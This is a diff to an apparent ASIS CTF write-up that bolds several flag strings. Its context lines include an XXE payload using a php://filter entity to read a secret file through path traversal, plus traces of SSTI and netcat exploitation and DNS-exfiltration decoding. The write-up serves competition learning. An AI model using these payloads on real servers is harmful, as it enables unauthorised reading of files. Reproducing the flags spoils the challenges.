@@ -46,7 +46,7 @@ print r.text
 ```
 
 <br>
-Response contained flag : ASIS{I_L0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}
+Response contained flag : <b>ASIS{I_L0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}</b>
 
 
 <br><br>
@@ -68,7 +68,7 @@ Second find : http://128.199.40.185:8081/panelManager-0.1/ XXE injection in docx
 the solution was to download their doc file called (demo) open with archive and change inner xml (word/document.xml) with an xxe  php filter was working <br>
 ```<!DOCTYPE roottag [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../../fileSharing/s3cRetP4th/flagIsHeregRabiT.flag"> ]>```<br>
 <br> the directory of the flag was found using the first vuln <br>
-Flag : ASIS{Vuln_web_appZ_plus_misc0nfig_eQ_dis4st3R!}
+Flag : <b>ASIS{Vuln_web_appZ_plus_misc0nfig_eQ_dis4st3R!}</b>
 <br><br>
 <b>------------------------------------------------------------------------------------------------------------------------------------------------------------------</b>
 <br><br><br>
@@ -96,7 +96,7 @@ nc.interactive()
 ```
 
 <br>
-Flag : ASIS{Th3_Bra1n_Wash1nG_HAHA_AI_IS_INTERESTING}
+Flag : <b>ASIS{Th3_Bra1n_Wash1nG_HAHA_AI_IS_INTERESTING}</b>
 <br><br>
 <b>------------------------------------------------------------------------------------------------------------------------------------------------------------------</b>
 <br><br>
@@ -108,4 +108,4 @@ The challenge provided a DNS capture, after analyzing it for a bit we can extrac
 10.111110100001001111101011001010011100100010001011111010000101100.010111010010110111011101111101011100110011101101001011010011110.000011101100101011111010110111101100101010010010110010101000001.asisctf.com <br>
 Cleaning that prefix from dots and reading it right to right didn't give printable string <br>
 after adding a zero it becomes : 010000010101001101001001010100110111101101011111010100110111000001111001011010010110111001100111010111110111011101101001011101000110100001011111010001000100111001010011010111110010000101111101 <br>
-bin to ascii => ASIS{_Spying_with_DNS_!} 
+bin to ascii => <b>ASIS{_Spying_with_DNS_!} </b>
